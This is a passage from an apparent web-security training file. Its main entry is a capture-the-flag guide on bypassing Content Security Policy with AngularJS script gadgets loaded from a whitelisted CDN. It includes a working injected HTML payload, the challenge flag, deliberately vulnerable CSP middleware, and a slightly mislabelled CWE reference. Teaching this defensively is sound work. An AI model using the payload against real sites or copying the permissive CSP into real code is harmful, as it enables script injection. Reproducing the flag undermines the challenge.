    keyTakeaways: '• Standard Markdown passes raw HTML through by design.\n• Never render compiled Markdown output without a secondary HTML sanitizer.\n• Always use DOMPurify to clean compiled Markdown.'
  },

  // -------------------------------------------------------------------------
  // 30. Content Security Policy (CSP) Bypass
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'csp-bypass-script-gadget',
    title: 'Content Security Policy (CSP) Bypass via Script Gadgets and CDN Endpoints',
    slug: 'csp-bypass-script-gadget-guide',
    description: 'Explore how misconfigured Content Security Policies with wildcard CDNs or script gadgets (AngularJS, jQuery) are bypassed.',
    category: 'cross-site-scripting',
    difficulty: ChallengeDifficulty.HARD,
    owaspReference: 'OWASP Top 10 A05:2021 – Security Misconfiguration',
    cweReference: 'CWE-1021: Improper Restriction of Rendered UI Layers or Scripts',
    cvssScore: 7.8,
    status: ChallengeStatus.PUBLISHED,
    overview: 'Content Security Policy (CSP) is an HTTP header defense that restricts the resources (scripts, images, stylesheets) that the browser is permitted to load. However, when CSP policies are misconfigured—such as whitelisting entire CDNs (`cdnjs.cloudflare.com` or `googleapis.com`), or when legitimate client-side libraries like AngularJS are present on the page—attackers can use legitimate whitelisted scripts as "gadgets" to execute arbitrary code without violating CSP.',
    rootCause: 'The CSP policy whitelisted broad CDN domains or allowed JSONP endpoints and client-side template engines that parse user expressions.',
    mechanics: '1. CSP Inspection: Header reads: `script-src \'self\' https://cdnjs.cloudflare.com`.\n2. Constraint: Attacker cannot execute inline `<script>` tags.\n3. Gadget Loading: Attacker injects `<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>`.\n4. Template Execution: Attacker adds: `<div ng-app ng-csp>{{$on.constructor(\'alert(1)\')()}}</div>`.\n5. Execution: AngularJS evaluates the expression within the whitelisted script, executing code without inline script violations.',
    attackScenario: 'Injected HTML payload:\n<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js"></script>\n<div ng-app ng-csp>{{$on.constructor(\'fetch("/api/flag").then(r=>r.json()).then(d=>alert(d.flag))\')()}}</div>\n\nResult: Script executes despite CSP! Flag: WEBSEC{csp_bypass_script_gadget_angular_evaluated}',
    securityImpact: 'Neutralization of Content Security Policy, leading to complete script execution in hardened environments.',
    prevention: '1. Use nonce-based CSP (`script-src \'nonce-{random}\'`) or hash-based CSP instead of domain whitelists.\n2. Avoid whitelisting broad CDNs that host multiple libraries.\n3. Remove legacy client-side template libraries with expression parsers.',
    vulnerableCode: `// Vulnerable: Overly permissive CSP header whitelisting entire CDN domains
app.use((req, res, next) => {
  // Flaw: Allows any script from cdnjs, including vulnerable libraries and JSONP endpoints!
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com;"
  );
  next();
});`,
    secureCode: `// Remediated: Strict nonce-based Content Security Policy
import crypto from 'crypto';

app.use((req, res, next) => {
  // Generate high-entropy cryptographic nonce per request
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.nonce = nonce;

  res.setHeader(
    'Content-Security-Policy',
    \`default-src 'self'; script-src 'self' 'nonce-\${nonce}'; object-src 'none'; base-uri 'self';\`
  );
  next();
});`,
    codeLanguage: 'typescript',
    realWorldExample: 'Google\'s security research team famously demonstrated that over 95% of domain-whitelist CSPs on the top 1 million websites can be bypassed using known script gadgets on whitelisted domains.',
    references: [
      { title: 'Google CSP Evaluator Tool', url: 'https://csp-evaluator.withgoogle.com/' },
      { title: 'OWASP Content Security Policy Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html' }
    ],
    keyTakeaways: '• Domain-based CSP whitelists are almost always bypassable via CDNs or JSONP.\n• Nonce-based CSP (`script-src \'nonce-...\'`) is the modern gold standard.\n• Client-side template engines (AngularJS, Vue) can act as script execution gadgets.'
  }
];
